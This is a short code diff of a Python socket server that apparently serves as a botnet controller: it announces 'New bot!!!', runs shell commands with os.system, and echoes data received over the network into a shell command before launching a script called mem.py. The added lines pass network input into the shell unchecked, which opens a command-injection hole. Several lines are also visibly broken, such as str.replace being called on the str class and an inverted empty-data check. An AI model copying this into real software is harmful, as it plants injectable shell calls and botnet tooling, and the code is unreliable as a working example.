@@ -35,10 +35,10 @@ while True:
      try:
        data = conn.recv(1024).decode()
        print(data)
-      iuf = str.replace('d', '', 1)
-      slp = 'echo '+iuf+'>ip.txt'
-      os.system(slp)
-      os.system('python3 mem.py')
+       iuf = str.replace('d', '', 1)
+       slp = 'echo '+iuf+'>ip.txt'
+       os.system(slp)
+       os.system('python3 mem.py')
       
      except:
        pass
@@ -53,8 +53,12 @@ while True:
     os.system(com)
     print(Fore.CYAN + " [+] " + Fore.BLUE + "New bot!!!")
     print("")
-    data = conn.recv(10240)
+    data = conn.recv(1024).decode()
     print(data)
+    iuf = str.replace('d', '', 1)
+    slp = 'echo '+iuf+'>ip.txt'
+    os.system(slp)
+    os.system('python3 mem.py')
     if not data:
       conn.send(data.upper())
       conn.close()
